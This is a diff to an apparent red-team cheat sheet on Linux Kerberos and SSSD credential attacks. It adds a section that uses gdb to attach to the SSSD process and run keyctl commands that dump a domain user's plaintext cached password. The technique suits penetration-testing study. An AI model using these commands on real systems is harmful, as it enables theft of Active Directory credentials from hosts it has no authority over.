@@ -40,7 +40,7 @@ make CONF=Release
 
 ## CCACHE ticket reuse from SSSD KCM
 
-SSSD maintains a copy of the database at the path `/var/lib/sss/secrets/secrets.ldb`. 
+System Security Services Daemon (SSSD) maintains a copy of the database at the path `/var/lib/sss/secrets/secrets.ldb`. 
 The corresponding key is stored as a hidden file at the path `/var/lib/sss/secrets/.secrets.mkey`. 
 By default, the key is only readable if you have **root** permissions.
 
@@ -130,7 +130,53 @@ De-obfuscate the content of the ldap_default_authtok variable with [mludvig/sss_
 ```
 
 
+## Extract accounts from SSSD keyring
+
+**Requirements**:
+
+* `krb5_store_password_if_offline = True` in `/etc/sssd/sssd.conf`
+
+**Exploit**:
+
+When `krb5_store_password_if_offline` is enabled, the AD password is stored plaintext.
+
+```ps1
+[domain/domain.local]
+cache_credentials = True
+ipa_domain = domain.local
+id_provider = ipa
+auth_provider = ipa
+access_provider = ipa
+chpass_provider = ipa
+ipa_server = _srv_, server.domain.local
+krb5_store_password_if_offline = true
+```
+
+
+Grab the PID of the SSSD process and hook it in `gdb`. Then list the process keyrings.
+
+```ps1
+gdb -p <PID_OF_SSSD>
+call system("keyctl show > /tmp/output")
+```
+
+From the `/tmp/output` locate the `key_id` for the user you want.
+
+```ps1
+Session Keyring
+ 237034099 --alswrv      0     0  keyring: _ses
+ 689325199 --alswrv      0     0   \_ user: user@domain.local
+```
+
+Back to GDB: 
+
+```ps1
+call system("keyctl print 689325199 > /tmp/output")
+```
+
+
 ## References
 
 * [Kerberos Tickets on Linux Red Teams - April 01, 2020 | by Trevor Haskell](https://www.fireeye.com/blog/threat-research/2020/04/kerberos-tickets-on-linux-red-teams.html)
 * [All you need to know about Keytab files - Pierre Audonnet [MSFT] - January 3, 2018](https://blogs.technet.microsoft.com/pie/2018/01/03/all-you-need-to-know-about-keytab-files/)
+* [20.4. Caching Kerberos Passwords - Red Hat Customer Portal](https://access.redhat.com/documentation/fr-fr/red_hat_enterprise_linux/6/html/identity_management_guide/kerberos-pwd-cache)
